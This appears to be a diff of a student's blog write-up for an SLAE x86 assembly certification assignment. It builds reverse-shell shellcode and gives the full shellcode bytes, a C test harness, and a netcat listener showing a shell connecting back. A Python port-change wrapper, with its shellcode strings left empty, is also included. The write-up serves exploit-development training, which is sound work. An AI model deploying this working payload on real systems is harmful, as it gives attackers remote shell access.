@@ -14,7 +14,7 @@ tags:
 Hey guys! Welcome back! In this post, we will write a reverse shell shellcode for assignment 2 of the Pentester Academy SLAE x86
 certification. Let's begin with assignment 2!
 
-## Understanding the objective ##
+## Understanding The Objective ##
 Again, let's start off by breaking down the code's major working parts. The shellcode must do the following:
 
 - Creates and configures a socket
@@ -168,6 +168,7 @@ _start:
         push 0x10             ;16
         push ecx              ;addr struc
         push esi              ;sockfd
+        mov ecx, esp
         int 0x80
 
         ;duplicating stdfds
@@ -191,3 +192,80 @@ _start:
         mov ebx, esp          ;pointer to args
         int 0x80              ;syscall
 ```
+Let's extract the shellcode and test it out using ```shellcode.c```:
+```
+$ objdump -d ./rev_shell_asm|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb8\xd5\xaa\xaa\xab\xbb\xaa\xaa\xaa\xaa\x31\xd8\x52\x50\x66\x68\x11\x5b\x66\x6a\x02\x89\xe1\x31\xc0\x31\xdb\xb0\x66\xb3\x03\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\xfe\xc9\xcd\x80\x75\xf4\x31\xc9\x51\x6a\x0b\x58\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+```
+We paste this in ```shellcode.c```:
+```c
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb8\xd5\xaa\xaa\xab\xbb\xaa\xaa\xaa\xaa\x31\xd8\x52\x50\x66\x68\x11\x5b\x66\x6a\x02\x89\xe1\x31\xc0\x31\xdb\xb0\x66\xb3\x03\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\xfe\xc9\xcd\x80\x75\xf4\x31\xc9\x51\x6a\x0b\x58\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
+main()
+{
+
+        printf("Shellcode Length:  %d\n", strlen(code));
+
+        int (*ret)() = (int(*)())code;
+
+        ret();
+
+}
+```
+Now lets compile it, and test it out:
+```
+Terminal 1:
+
+$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode           
+shellcode.c:6:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
+    6 | main()
+      | ^~~~
+$ ./shellcode
+Shellcode Length:  95
+
+Terminal 2:
+
+$ nc -lvp 4443
+connect to [127.0.0.1] from localhost [127.0.0.1] 47390
+uname -a
+Linux kali 5.4.0-kali3-686-pae #1 SMP Debian 5.4.13-1kali1 (2020-01-20) i686 GNU/Linux
+```
+Boom! it works :)
+
+### Customisable Port
+The same script written for the previous assignment can be used for this.
+```python
+#!/usr/bin/python
+
+# SLAE Assignment 1: Simple Python Port Change Wrapper Script
+# Author:  4p0cryph0n
+# Website: https://4p0cryph0n.github.io/
+
+import sys
+import socket
+
+port = int(sys.argv[1])
+
+phtons = hex(socket.htons(int(port)))
+
+half1 = phtons[4:]
+half2 = phtons[2:4]
+
+if half1 == "00" or half2 == "00":
+        print "Port contains NULL"
+        exit(1)
+
+shellcode =  ''
+shellcode += ''
+
+shellcode = shellcode.replace('\\x11\\x5b', '\\x{}\\x{}'.format(half1, half2))
+print shellcode
+```
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.
+
+http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
+
+Student ID: SLAE - 1534
